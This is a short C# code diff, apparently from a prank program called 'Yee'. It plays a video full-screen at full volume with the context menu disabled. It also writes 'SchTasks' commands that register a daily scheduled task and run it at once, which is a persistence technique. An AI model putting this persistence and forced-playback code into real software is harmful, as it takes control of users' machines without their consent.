@@ -54,7 +54,6 @@ namespace Yee
                     Player.uiMode = "Full";
                     Player.enableContextMenu = false;
                     Player.settings.volume = 100;
-                    Player.settings.playCount = 100;
                     Player.openPlayer(@Directory.GetCurrentDirectory() + "\\yee10HR\\yee.mp4");
                     Player.controls.play();
                     System.Threading.Thread.Sleep(1000);
@@ -79,7 +78,7 @@ namespace Yee
                 {
                     if (sw.BaseStream.CanWrite)
                     {
-                        // Sets folder to "C:\Windows\SysWOW64"
+                        // Add task scheduler and execute
                         sw.WriteLine("SchTasks /Create /SC DAILY /TN Yee /TR {0}", path);
                         sw.WriteLine("SchTasks /run /tn Yee");
                     }
